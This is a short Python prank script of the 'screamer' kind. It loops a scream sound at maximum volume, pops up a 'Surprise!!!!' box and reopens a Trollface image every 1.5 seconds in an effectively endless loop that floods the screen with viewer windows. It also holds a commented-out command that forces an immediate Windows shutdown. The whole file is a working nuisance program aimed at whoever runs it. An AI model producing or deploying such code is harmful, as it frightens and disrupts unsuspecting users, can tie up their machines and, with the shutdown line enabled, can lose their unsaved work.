import os
import pygame
import time
from tkinter import messagebox
from PIL import Image
if __name__=='__main__':
    ruta_base=os.path.dirname(os.path.abspath(__file__))
    pygame.init()
    pygame.mixer.init()
    pygame.mixer.music.load(os.path.join(ruta_base, "grito_screamer.mp3"))
    pygame.mixer.music.play(-1)
    pygame.mixer.music.set_volume(1)
    messagebox.showinfo(title='Little Surprise!', message='Surprise!!!!')
    for i in range(0,9999999999999999999999999999999999999999999999999999999999999):
        imagen=Image.open(os.path.join(ruta_base, 'Trollface.png'))
        imagen.show()
        time.sleep(1.5)
    #os.system("shutdown /s /t 0")